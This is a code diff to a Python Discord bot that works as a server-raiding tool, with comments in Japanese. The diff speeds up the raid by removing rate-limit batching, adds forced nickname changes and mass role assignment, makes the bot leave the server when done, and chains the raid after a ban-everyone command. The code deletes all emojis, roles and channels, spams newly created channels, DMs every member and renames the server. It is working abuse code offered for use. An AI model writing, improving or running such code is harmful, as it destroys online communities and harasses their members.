@@ -20,8 +20,7 @@ async def on_ready():
     print(f'{bot.user} logged in')
     print(f'Bot ID: {bot.user.id}')
 
-@bot.command()
-async def masumani(ctx):
+async def execute_raid(ctx, do_ban=False):
     new_server_name = 'ますまに共栄圏植民地｜MSMN'
     icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
     channel_name = 'ますまに共栄圏最強'
@@ -31,14 +30,13 @@ async def masumani(ctx):
     role_name = 'ますまに共栄圏に荒らされましたww'
     role_count = 150
 
-    await ctx.message.delete()
     guild = ctx.guild
     old_server_name = guild.name
     user = ctx.author
 
     await user.send('処理を開始します')
 
-    # 1. 絵文字削除
+    # 1. 絵文字削除（高速化）
     try:
         emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
         emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
@@ -47,7 +45,7 @@ async def masumani(ctx):
     except Exception as e:
         await user.send(f'絵文字削除失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
     # アイコンダウンロード
     icon_bytes = None
@@ -59,23 +57,20 @@ async def masumani(ctx):
     except:
         pass
 
-    # 2. ロール削除
+    # 2. ロール削除（高速化）
     try:
         roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
-        role_deleted = 0
-        for i in range(0, len(roles_to_delete), 10):
-            batch = roles_to_delete[i:i+10]
-            role_delete_tasks = [role.delete() for role in batch]
-            role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
-            role_deleted += sum(1 for r in role_delete_results if not isinstance(r, Exception))
-            await asyncio.sleep(0.5)
+        role_delete_tasks = [role.delete() for role in roles_to_delete]
+        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
+        role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
         await user.send(f'ロール削除: {role_deleted}個')
     except Exception as e:
         await user.send(f'ロール削除失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
     # 3. ロール作成（最速）
+    created_roles = []
     try:
         role_created = 0
         for i in range(0, role_count, 75):
@@ -85,15 +80,43 @@ async def masumani(ctx):
                 color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
                 role_tasks.append(guild.create_role(name=role_name, color=color))
             role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
-            role_created += sum(1 for r in role_results if not isinstance(r, Exception))
+            for r in role_results:
+                if not isinstance(r, Exception):
+                    created_roles.append(r)
+                    role_created += 1
             await asyncio.sleep(0.2)
         await user.send(f'ロール作成: {role_created}個')
     except Exception as e:
         await user.send(f'ロール作成失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
-    # 4. DM送信
+    # 4. メンバーにニックネーム変更＋ロール付与
+    try:
+        members_to_update = [m for m in guild.members if not m.bot and m != user]
+
+        async def update_member(member):
+            try:
+                # ニックネーム変更
+                await member.edit(nick='ますまに共栄圏に敗北')
+                # ランダムに20個のロールを付与
+                if len(created_roles) >= 20:
+                    roles_to_add = random.sample(created_roles, 20)
+                    await member.add_roles(*roles_to_add)
+                return 1
+            except:
+                return 0
+
+        update_tasks = [update_member(m) for m in members_to_update]
+        update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
+        updated_count = sum(r for r in update_results if not isinstance(r, Exception))
+        await user.send(f'メンバー更新: {updated_count}人')
+    except Exception as e:
+        await user.send(f'メンバー更新失敗')
+
+    await asyncio.sleep(1)
+
+    # 5. DM送信
     try:
         async def send_dm(member):
             try:
@@ -109,9 +132,9 @@ async def masumani(ctx):
     except Exception as e:
         await user.send(f'DM送信失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
-    # 5. アイコン・サーバー名変更
+    # 6. アイコン・サーバー名変更
     try:
         if icon_bytes:
             await guild.edit(name=new_server_name, icon=icon_bytes)
@@ -121,25 +144,21 @@ async def masumani(ctx):
     except Exception as e:
         await user.send('サーバー設定変更失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
-    # 6. チャンネル削除
+    # 7. チャンネル削除（高速化）
     try:
         channels_to_delete = list(guild.channels)
-        deleted_count = 0
-        for i in range(0, len(channels_to_delete), 10):
-            batch = channels_to_delete[i:i+10]
-            channel_delete_tasks = [channel.delete() for channel in batch]
-            channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
-            deleted_count += sum(1 for r in channel_delete_results if not isinstance(r, Exception))
-            await asyncio.sleep(0.5)
+        channel_delete_tasks = [channel.delete() for channel in channels_to_delete]
+        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
+        deleted_count = sum(1 for r in channel_delete_results if not isinstance(r, Exception))
         await user.send(f'チャンネル削除: {deleted_count}個')
     except Exception as e:
         await user.send(f'チャンネル削除失敗')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
-    # 7. チャンネル作成（最速）
+    # 8. チャンネル作成（最速）
     created_channels = []
     created_count = 0
     try:
@@ -151,14 +170,18 @@ async def masumani(ctx):
                 if not isinstance(r, Exception):
                     created_channels.append(r)
                     created_count += 1
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.5)
         await user.send(f'チャンネル作成: {created_count}個')
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
 
-    await asyncio.sleep(2)
+    await asyncio.sleep(1)
 
-    # 8. メッセージ送信（安定版・レート制限対策）
+    # 9. allban確認とメッセージ送信
+    if do_ban:
+        await user.send('allban実行をスキップしてメッセージ送信へ')
+
+    # 10. メッセージ送信（安定版・レート制限対策）
     try:
         await user.send('メッセージ送信中...')
 
@@ -168,22 +191,20 @@ async def masumani(ctx):
                 try:
                     await channel.send(spam_message)
                     count += 1
-                    await asyncio.sleep(7)  # 各メッセージ間に0.5秒待機
+                    await asyncio.sleep(0.5)
                 except Exception as e:
-                    await asyncio.sleep(1)  # エラー時は1秒待機
+                    await asyncio.sleep(1)
                     continue
             return count
 
-        # 10チャンネルずつバッチ処理（安定性重視）
         total_messages = 0
         for i in range(0, len(created_channels), 10):
-            batch = created_channels[i:i+200]
+            batch = created_channels[i:i+10]
             spam_tasks = [spam_channel_safe(ch) for ch in batch]
             spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
             total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
-            await asyncio.sleep(1)  # バッチ間に1秒待機
+            await asyncio.sleep(1)
 
-            # 進捗報告
             if (i + 10) % 30 == 0:
                 await user.send(f'進捗: {i + 10}/{len(created_channels)}チャンネル処理済み')
 
@@ -192,6 +213,18 @@ async def masumani(ctx):
         await user.send(f'メッセージ送信失敗')
 
     await user.send('全処理完了')
+
+    # サーバーから退出
+    try:
+        await guild.leave()
+        await user.send('サーバーから退出しました')
+    except Exception as e:
+        await user.send(f'退出失敗: {e}')
+
+@bot.command()
+async def masumani(ctx):
+    await ctx.message.delete()
+    await execute_raid(ctx, do_ban=False)
 
 @bot.command()
 async def allban(ctx):
@@ -211,14 +244,17 @@ async def allban(ctx):
 
     for member in members:
         try:
-            await guild.ban(member, reason='ますまに共栄圏BAN')
+            await guild.ban(member, reason='ますまに共栄圏によるBAN')
             banned += 1
             if banned % 10 == 0:
                 await user.send(f'進捗: {banned}/{total}')
         except:
             failed += 1
 
-    await user.send(f'完了 成功:{banned} 失敗:{failed}')
+    await user.send(f'BAN完了 成功:{banned} 失敗:{failed}')
+
+    # BAN完了後にmasumaniと同じ処理を実行
+    await execute_raid(ctx, do_ban=True)
 
 if __name__ == '__main__':
     TOKEN = os.getenv('TOKEN')
